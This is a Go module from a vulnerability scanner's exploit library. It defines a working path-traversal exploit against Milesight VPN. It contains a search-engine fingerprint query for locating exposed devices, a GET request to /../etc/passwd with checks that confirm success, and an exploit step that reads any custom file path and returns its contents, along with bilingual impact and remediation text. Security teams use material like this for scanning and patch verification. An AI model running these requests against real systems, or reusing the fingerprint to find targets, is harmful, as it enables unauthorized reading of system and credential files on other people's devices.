package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Milesight VPN /../etc/passwd File Read Vulnerability",
    "Description": "<p> Milesight VPN is a Virtual Private Network (VPN) solution developed and offered by Milesight Technology Co. It is designed to provide users with a secure, private and anonymous network connection that protects their data and privacy while allowing them to access restricted network resources. The vulnerability can be exploited to read important system files (e.g., database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure web site.</p>",
    "Product": "Milesight-VPN",
    "Homepage": "https://www.milesight-iot.com/milesightvpn/",
    "DisclosureDate": "2024-04-10",
    "PostTime": "2024-04-12",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "(body=\"glyphicon-remove\" && body=\"$randdt;\") || body=\"MilesightVPN\"",
    "GobyQuery": "(body=\"glyphicon-remove\" && body=\"$randdt;\") || body=\"MilesightVPN\"",
    "Level": "2",
    "Impact": "<p>The vulnerability can be exploited to read important system files (e.g., database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure web site.</p>",
    "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability: <a href=\"https://www.milesight-iot.com\">https://www.milesight-iot.com</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls.</p><p>3. Keep the system off the public web if it is not necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "/etc/passwd",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/../etc/passwd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "/bin",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/../etc/passwd",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/../etc/passwd"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/..{{{custom}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read",
        "HW-2023"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Milesight VPN /../etc/passwd 文件读取漏洞",
            "Product": "Milesight-VPN",
            "Description": "<p>Milesight VPN 是一种虚拟专用网络（Virtual Private Network）解决方案，由 Milesight Technology Co., Ltd. 开发和提供。它旨在为用户提供安全、私密和匿名的网络连接，保护用户的数据和隐私，同时允许用户访问受限制的网络资源。攻击者可通过该漏洞读取系统重要⽂件（如数据库配置⽂件、系统配置⽂件）、数据库配置⽂件等等，导致⽹站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://www.milesight-iot.com\" target=\"_blank\">https://www.milesight-iot.com</a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>3、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要⽂件（如数据库配置⽂件、系统配置⽂件）、数据库配置⽂件等等，导致⽹站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "Milesight VPN /../etc/passwd File Read Vulnerability",
            "Product": "Milesight-VPN",
            "Description": "<p>&nbsp;Milesight VPN is a Virtual Private Network (VPN) solution developed and offered by Milesight Technology Co. It is designed to provide users with a secure, private and anonymous network connection that protects their data and privacy while allowing them to access restricted network resources. The vulnerability can be exploited to read important system files (e.g., database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure web site.<br></p>",
            "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability:&nbsp;<a href=\"https://www.milesight-iot.com\" target=\"_blank\">https://www.milesight-iot.com</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls.</p><p>3. Keep the system off the public web if it is not necessary.</p>",
            "Impact": "<p>The vulnerability can be exploited to read important system files (e.g., database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure web site.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
